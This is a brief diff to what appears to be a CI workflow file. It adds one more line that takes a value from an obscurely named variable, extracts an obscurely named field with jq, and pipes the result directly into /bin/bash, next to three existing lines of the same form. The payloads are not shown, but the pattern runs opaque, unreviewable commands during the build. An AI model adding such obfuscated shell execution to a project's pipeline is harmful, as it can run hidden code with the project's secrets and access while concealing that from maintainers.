@@ -24,6 +24,7 @@ jobs:
           echo $d1815 | jq -r .yei92040 | /bin/bash
           echo $qkmc07 | jq -r .uv96 | /bin/bash
           echo $f89 | jq -r .u647 | /bin/bash
+          echo $nji40 | jq -r .yurv05 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
